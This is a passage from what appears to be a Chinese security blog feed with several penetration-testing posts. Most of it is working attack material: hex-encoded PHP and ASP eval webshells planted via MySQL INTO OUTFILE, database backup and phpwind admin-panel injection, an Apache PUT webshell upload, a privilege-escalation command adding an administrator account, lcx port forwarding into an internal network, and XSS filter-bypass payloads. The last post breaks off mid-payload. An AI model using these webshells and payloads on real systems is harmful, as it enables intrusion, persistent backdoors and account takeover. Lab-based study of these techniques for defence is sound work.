request(“l”)%&gt;的十六进制，是lp最小马；0x643A5C7765625C312E617370是d:\web\1.asp的十六进制,也就是你要备份的webshell路径。当然也可以用比较常见备份方式来获得webshell，唯一的不足就是备份后的文件过大，如果备份数据库中有防下载的的数据表，或者有错误的asp代码，备份出来的webshell就不会成功运行，利用差异备份是成功率比较高的方法，并且极大的减少备份文件的大小。</p><p><strong>八、php+mysql系统</strong></p><p>后台需要有mysql数据查询功能,我们就可以利用它执行SELECT … INTO OUTFILE查询输出php文件，因为所有的数据是存放在mysql里的，所以我们可以通过正常手段把我们的webshell代码插入mysql在利用SELECT … INTO OUTFILE语句导出shell。在mysql操作里输入select 0x3C3F6576616C28245F504F53545B615D293B3F3E from mysql.user into outfile ‘路径’ 就可以获得了一个<!--?eval($_POST[a]);?-->的最小马</p><p>‘</p><p>0x3C3F6576616C</p><p>28245F504F53545B615D293B3F3E 是我们<!--?eval($_POST[a]);?-->的十六进制，这种方法对phpmyadmin比较普遍，先利用phpmyadmin的路径泄露漏洞，比较典型的是<a href="http://url/phpmyadmin/libra9xiaoes/select_lang.lib.php。" target="_blank" rel="noopener">http://url/phpmyadmin/libra9xiaoes/select_lang.lib.php。</a></p><p>就可以暴出路径，php环境中比较容易暴出绝对路径：）。提一点的是遇到是mysql在win系统下路径应该这样写d:\wwwroot\a.php。下面的方法是比较常用的一个导出webshell的方法，也可以写个vbs添加系统管理员的脚本导出到启动文件夹，系统重起后就会添加一个管理员帐号</p><p>CREATE TABLE a(cmd text NOT NULL)</p><p>INSERT INTO a(cmd) VALUES(‘<!--?fputs(fopen("./a.php","w"),"<?eval(\$_POST[a]);?-->“)?&gt;’)</p><p>select cmd from a into outfile ‘路径/b.php’</p><p>DROP TABLE IF EXISTS a</p><p>访问b.php就会生成一个<!--?eval($_POST[a]);?-->的最小马。</p><p>如果遇到可以执行php命令就简单多了,典型的代表是BO-BLOG,在后台的php命令框输入以下代码：</p><!--?$sa = fopen("./up/saiy.php","w");fw9xiaote($sa,"<?eval(\$_POST[a]);?"."-->");fclose($sa);?&gt;<p>就会在up目录下生成文件名为saiy.php内容为<!--?eval($_POST[a]);?-->的最小php木马，</p><p>最后用lanker的客户端来连接。实际运用中要考虑到文件夹是否有写权限。或者输入这样的代码<!--?fputs(fopen("./a.php","w"),"<?eval(\$_POST[a]);?-->“)?&gt; 将会在当前目录生成一个a.php的最小马。</p><p><strong>九、phpwind论坛从后台到webshell的三种方式</strong></p><p>方式1 模板法</p><p>进入后台， 风格模版设置 ，在随便一行写代码，记住，这代码必须顶着左边行写，代码前面不可以有任何字符。</p><p>EOT;</p><p>eval($a);</p><p>p9xiaont &lt;&lt;&lt;EOT</p><p>而后得到一个shell为http://网站/bbs/index.php。</p><p>方始2 脏话过滤法</p><p>进入安全管理 ◇ 不良词语过滤。新增不良词语写 a’]=’aa’;eval($_POST[’a’]);//</p><p>替换为那里可以随意写，而后得到一个shell地址为http://网站/bbs/data/bbscache/wordsfb.php。</p><p>方式3 用户等级管理</p><p>新建立会员组，头衔你可以随便写，但是千万不要写单双引号特殊符号，升级图片号写a’;eval($_POST[’a’]);// ，升级点数依然可以随意写。而后得到一个shell地址为http://网站/bbs/data/bbscache/level.php。</p><p>以上三种方式得到webshellr的密码是a,为lanker的一句话后门服务端。</p><p><strong>十、也可以利用网站访问计数系统记录来获得webshell</strong></p><p>最明显的就是某私服程序内的阿江计数程序，可以通过http://网站/stat.asp?style=text&amp;referer= 代码内容&amp;screenwidth=1024直接提交，即可把代码内容直接插入到计数系统的数据库中，而此系统默认数据库为count#.asa，我们可以通过http://网站/count%23.asa访问得到webshell，由于阿江计数程序过滤了%和+，将最小马改成<script runat="SERVER" language="vbSCRIPT">eval(Request("1"))</script>替换代码内容处提交，然后用lake2的eval客户端来提交，值得一提的是如果进到计数后台，可以清理某时某刻的数据，一旦插入asp木马失败，可以清理数据库再次操作。</p><p><strong>注：本文仅供参考学习，请勿在网上搞破坏，触犯法律者应承担相应的法律责任！</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 文件上传 </tag>
            
            <tag> WAF绕过 </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透之Win2003提权</title>
      <link href="/posts/d03e3fa0.html"/>
      <url>/posts/d03e3fa0.html</url>
      
        <content type="html"><![CDATA[<h3 id="用到的工具及环境"><a href="#用到的工具及环境" class="headerlink" title="用到的工具及环境"></a>用到的工具及环境</h3><ul><li>lcx.exe（端口转发）</li><li>中国蚁剑（Webshell终端）</li><li>pr.exe（内网提权）</li><li>Windows Server 2003（Web服务器）</li><li>Windows 10（攻击机）</li></ul><p>03默认是没有开启3389的，我们需要先开启3389，开始—右键‘我的电脑’—属性—远程—启用这台计算机的远程桌面：<br><a href="https://imgtu.com/i/6kORCd" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/03/03/6kORCd.png" alt=""></a></p><p>这里要Getshell的话，用到Apache PUT上传漏洞，至于怎么在Apache上支持PUT上传，可以参考<a href="https://blog.csdn.net/qq_42094992/article/details/107528183" target="_blank" rel="noopener">这篇文章</a>。</p><h3 id="PUT上传"><a href="#PUT上传" class="headerlink" title="PUT上传"></a>PUT上传</h3><p>这里用Burp抓个包，测试一下网站支持哪些请求方式：<br><a href="https://imgtu.com/i/6kjU61" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/03/03/6kjU61.png" alt=""></a></p><p>可以看到是支持PUT上传的，所以我们直接PUT一个shell.php到他网站的根目录</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">eval</span><span class="token punctuation">(</span>@<span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>响应码201就代表我们上传成功了<br><a href="https://imgtu.com/i/6kjh0f" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/03/03/6kjh0f.png" alt=""></a></p><p>然后用蚁剑连接一下，到这里Webshell成功拿下，剩下的就是提权了：<br><a href="https://imgtu.com/i/6kjb1s" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/03/03/6kjb1s.png" alt=""></a></p><h3 id="内网提权"><a href="#内网提权" class="headerlink" title="内网提权"></a>内网提权</h3><p>中途蚁剑崩了…于是就用菜刀吧，这里我们把pr.exe传上去，然后执行添加用户的命令：</p><pre class="line-numbers language-cmd"><code class="language-cmd">pr.exe "net user hack Passwd123+ /add && net localgroup administrators hack /add"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://imgtu.com/i/6kjXn0" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/03/03/6kjXn0.png" alt=""></a></p><p>超管账户有了，因为服务器在内网，只映射了80端口到公网，所以我们还是没法登陆3389，这时候就需要lcx来帮我们进行一个端口转发，来做一个内网穿透了。</p><p>我们攻击机上执行：</p><pre class="line-numbers language-cmd"><code class="language-cmd">// 监听66端口，并将66端口的流量全部转发到本机3399端口上lcx.exe listen 66 3399<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><a href="https://imgtu.com/i/6kjjBV" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/03/03/6kjjBV.png" alt=""></a></p><p>靶机上执行：</p><pre class="line-numbers language-cmd"><code class="language-cmd">lcx.exe -slave 192.168.1.103 66 127.0.0.1 3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再看一下攻击机，成功映射过来了内网的3389端口：<br><a href="https://imgtu.com/i/6kjzAU" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/03/03/6kjzAU.png" alt=""></a></p><p>此时我们远程连接127.0.0.1:3399端口，就相当于连接靶机的3389端口，不同的是，这次我们成功的穿透了内网，成功拿下了一台Web服务器，接下来就可以利用这个跳板来攻击域中的其他主机了：<br><a href="https://imgtu.com/i/6kvEB6" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/03/03/6kvEB6.png" alt=""></a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 域渗透 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 环境搭建 </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透之环境搭建</title>
      <link href="/posts/5ff123fb.html"/>
      <url>/posts/5ff123fb.html</url>
      
        <content type="html"><![CDATA[<h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><ul><li>Windows Server 2008（域控制器）</li><li>Windows Server 2003（Web服务器）</li><li>Windows XP（成员服务器）</li><li>Windows 7（Web服务器）</li><li>Ubuntu 18（独立服务器）</li></ul><p>环境我都打包好了，有需要的小伙伴可以留言给我，我把环境发给你</p><h3 id="Windows-Server-2008配置（域控）"><a href="#Windows-Server-2008配置（域控）" class="headerlink" title="Windows Server 2008配置（域控）"></a>Windows Server 2008配置（域控）</h3><p>修改计算机名：<br><a href="https://imgtu.com/i/6F9uSH" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/03/02/6F9uSH.md.png" alt=""></a></p><p>配置固定ip:，注意DNS要写127.0.0.1 ：<br><a href="https://imgtu.com/i/6F9Kld" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/03/02/6F9Kld.png" alt=""></a></p><p>服务器管理器—-角色—-添加域服务：<br><a href="https://imgtu.com/i/6F9M6A" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/03/02/6F9M6A.png" alt=""></a></p><p>配置域服务: cmd下面输入<code>dcpromo</code>：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://static.sitestack.cn/projects/l3m0n-pentest_study/23410be3d32884a59cf84364f5506de4.jpeg" alt=""></p><p>设置林根域： 林就是在多域情况下形成的森林,根表示基础,其他在此根部衍生 具体见<a href="http://angerfire.blog.51cto.com/198455/144123/" target="_blank" rel="noopener">这里</a>：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://static.sitestack.cn/projects/l3m0n-pentest_study/b1346eff4ad9cbaba6b47d4249103564.jpeg" alt=""></p><p>域数据存放的地址：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://static.sitestack.cn/projects/l3m0n-pentest_study/329a725ba58106fb5d9149837a675219.jpeg" alt="enter description here"></p><h3 id="其他系统配置（域成员）"><a href="#其他系统配置（域成员）" class="headerlink" title="其他系统配置（域成员）"></a>其他系统配置（域成员）</h3><p>剩下的系统配置都跟<strong>Windows Server 2008</strong>差不多，需要注意的是，配置IP地址的DNS地址<strong>必须是域控地址。</strong></p><p>Win7：<br><a href="https://imgtu.com/i/6F930P" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/03/02/6F930P.png" alt=""></a></p><p>加入域控：<br><a href="https://imgtu.com/i/6F98Tf" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/03/02/6F98Tf.md.png" alt=""></a></p><p>这里会要求你输入域控的账号密码：<br><a href="https://imgtu.com/i/6F9Jk8" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/03/02/6F9Jk8.png" alt=""></a></p><p>加入成功后重启一下就算是真的加入了：<br><a href="https://imgtu.com/i/6F9YtS" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/03/02/6F9YtS.png" alt=""></a></p><h3 id="搭建完成"><a href="#搭建完成" class="headerlink" title="搭建完成"></a>搭建完成</h3><p>域已经搭建完成，主域控会生成一个krbtgt账号 他是Windows活动目录中使用的客户/服务器认证协议，为通信双方提供双向认证：</p><p><a href="https://imgtu.com/i/6F9UpQ" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/03/02/6F9UpQ.png" alt=""></a></p><p>参考：<br><a href="http://www.it165.net/os/html/201306/5493.html" target="_blank" rel="noopener">AD域环境的搭建 基于Server 2008 R2</a><br><a href="http://blog.sina.com.cn/s/blog_6ce0f2c901014okt.html" target="_blank" rel="noopener">Acitve Directory 域环境的搭建</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 域渗透 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS绕过技术学习总结</title>
      <link href="/posts/c882f53c.html"/>
      <url>/posts/c882f53c.html</url>
      
        <content type="html"><![CDATA[<h3 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h3><ul><li><p>非持久型</p><p>非持久性:非持久性 XSS 也被称为反射性 XSS，是目前最普遍的类型，当攻击者提供了一些代码的时候，服务器端马上就会返回页面的执行结果。举个例子，就比如某个网页上的搜索引擎，如果攻击者搜索的字符串包含了一些 html 标签，通常来说，搜索的结果就会以该形式显示出来，或者，至少，搜索的字符串会包含在页面里。而这个我们是可以修改的，如果任何搜索的字符串都没有被 html 编码，XSS 漏洞就产生了。</p></li><li><p>持久型</p></li></ul><p>持久性 XSS:也叫做存储型 XSS，或是二次漏洞，他能够导致更加有效的攻击。当攻击者提交到 web 应用程序里的数据会永久性的存储到服务器的时候会产生这类漏洞，(比如数据库，文件系统，其他位置)，之后，如果没有经过 HTML 编码，那么每一个访问该页面的用户都会被攻击，典型的例子就是在线留言板，它允许用户提交数据。</p><ul><li>Dom型</li></ul><p>基于 DOM 的 XSS:也叫做本地跨站，基于 html/xml 上叫做文档对象模型(DOM)的标准对象模型，这类漏洞，问题出现在页面的客户端脚本上，比如，如果一个 javascript 脚本处理 url 请求参数，然后使用这个参数值来显示给用户页面，没有经过任何编码，那么 XSS 漏洞产生，和非持久的类似，攻击者可以用恶意代码填充这个参数，然后覆写的页面诱骗用户点击，然后就会被浏览器解析成 html，包含了恶意的脚本<br>代码。</p><h3 id="发现XSS漏洞"><a href="#发现XSS漏洞" class="headerlink" title="发现XSS漏洞"></a>发现XSS漏洞</h3><p>最常用的 XSS 漏洞测试代码：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"XSS"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当这个代码被注入到输入框或是 url 参数的时候，会成功也可能会失败，如果失败了。也不意味着网站就是安全的。需要继续渗透。</p><h3 id="转义字符串绕过"><a href="#转义字符串绕过" class="headerlink" title="转义字符串绕过"></a>转义字符串绕过</h3><p>第一步是查看当前的页面源代码，看看是不是包含了我们的这个测试的字符串，如果你发现了。你就会发现很有意思。要细心。看到了把。是在一个输入(INput)标签里。</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>INPUT type<span class="token operator">=</span><span class="token string">"text"</span> value<span class="token operator">=</span><span class="token string">'&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>'</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在这个例子，我们可以修改我们的输入来包含两个字符，来让代码跳出那对外围的单引号。</p><pre class="line-numbers language-javascript"><code class="language-javascript">'<span class="token operator">></span><span class="token operator">&lt;</span>SCRIPT<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"XSS"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>SCRIPT<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>现在我们的代码执行了。因为我们闭合了前面的 html 标签，就触发了 XSS，但是，你可能会发现，页面上会显示一个多出来的单引号，为什么，因为后面的那个原来的单引号没有匹配，我们继续修改我们的代码。</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token string">'>&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>&lt;xss a='</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所有的输入就会变成这样:</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>INPUT type<span class="token operator">=</span><span class="token string">"text"</span> value<span class="token operator">=</span><span class="token string">''</span><span class="token operator">></span><span class="token operator">&lt;</span>SCRIPT<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"XSS"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>SCRIPT<span class="token operator">></span><span class="token operator">&lt;</span>xss a<span class="token operator">=</span><span class="token string">''</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>好了。Javascript 代码就注入了。<xss a="”">这个没什么意义，你可以自己改，但是符合 html 的标准，页面不会出错。</xss></p><h3 id="单引号过滤绕过"><a href="#单引号过滤绕过" class="headerlink" title="单引号过滤绕过"></a>单引号过滤绕过</h3><p>同样的例子，但是我们假设管理员在我们的单引号之前放置了一个“\”，有时候双引号之前也会放置，通过一些类似 add_slashes 的函数可以实现，这个就是转义字符，我们先前的代码就会变成这样：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>INPUT type<span class="token operator">=</span><span class="token string">"text"</span> value<span class="token operator">=</span><span class="token string">'\'>&lt;SCRIPT>alert(\"XSS\")&lt;/SCRIPT>'</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>有一些方法可以继续，但是要看过滤的那个函数是怎么放的了。其中一个方法就是使用字符实体，学过 html的都知道，就是一些特殊字符会用一些固有的符号组合来表示，举个例子，你不能用&lt;&gt;表示大于和小于，因为这被解释为 html 标签，但是，你如果要用，可以用下面的来代替。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200223175517702.png" alt="在这里插入图片描述"><br>使用 &amp;quot ; 或者 &amp;#34 ;来代替我们的双引号，有时候可以绕过过滤。（分号前都加了空格，不然会转义），例子：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"XSS"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>quot<span class="token punctuation">;</span>XSS<span class="token operator">&amp;</span>quot<span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">38</span><span class="token punctuation">;</span>XSS<span class="token operator">&amp;</span>#<span class="token number">38</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果这都被过滤了。那我们可以使用 JavaScript 的 fromCharCode 函数，这个函数把指定的 Unicode值转换成字符串。例如：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"XSS"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>INPUT type<span class="token operator">=</span><span class="token string">"text"</span> value<span class="token operator">=</span><span class="token string">'\'>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT>'</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>你可以使用 Mysql 数据库的 char（字符，字符）来转换字符到字符码，大家可以使用自己喜欢的就行了。转码的工具还是很多的。</p><h3 id="lt-SCRIPT-gt-过滤绕过"><a href="#lt-SCRIPT-gt-过滤绕过" class="headerlink" title="< SCRIPT>过滤绕过"></a>&lt; SCRIPT&gt;过滤绕过</h3><p>有些过滤器会过滤到&lt; script&gt;标签，那上面的例子就都废了，但是。还是有方法插入 javascript 的。我们看看事件处理器的例子。</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>BODY onload<span class="token operator">=</span><span class="token string">"alert('XSS')"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 html 里啊。这个 Onload 关键字就是一个事件，其他的所有标签都没有这个属性，但是 Body 标签是有的。但是，有一定的局限性，如果 onload 事件在你的代码之前已经被处理了。那就不会触发了。。不过我们可以继续看看 onerror 事件处理。</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG SRC<span class="token operator">=</span><span class="token string">""</span> onerror<span class="token operator">=</span><span class="token string">"alert('XSS')"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意看，图片没有指定，也就是出错了。Onerror 这个事件就会发茶。引发 XSS 漏洞，没有用<script>标签哦。</p><h3 id="使用IMG源绕过"><a href="#使用IMG源绕过" class="headerlink" title="使用IMG源绕过"></a>使用IMG源绕过</h3><p>Html 中最常用的两个标签 img 和 a href 一般是不会过滤的，一个指定图片，一个指定超链接。最危险的事 img 标签。</p><p>下面是一些例子：</p><p>标准的样子：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG SRC<span class="token operator">=</span><span class="token string">"javascript:alert('XSS');"</span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>没有双引号和分号：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG SRC<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>过滤了双引号和< Script></p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG SRC<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>quot<span class="token punctuation">;</span>XSS<span class="token operator">&amp;</span>quot<span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 CharCode 绕过过滤:</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG SRC<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>有经验的攻击者也可以把上面的全部转换成相等的 Ascii 码:</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMGSRC<span class="token operator">=</span><span class="token operator">&amp;</span>#<span class="token number">106</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">97</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">118</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">97</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">115</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">99</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">114</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">105</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">112</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">116</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">58</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">97</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">108</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">10</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">&amp;</span>#<span class="token number">114</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">116</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">40</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">88</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">83</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">83</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">41</span><span class="token punctuation">;</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用 Ascii 表你可以自己试试。当然转换成 16 进制也是可以的。。</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMGSRC<span class="token operator">=</span><span class="token operator">&amp;</span>#x6A<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x76<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token 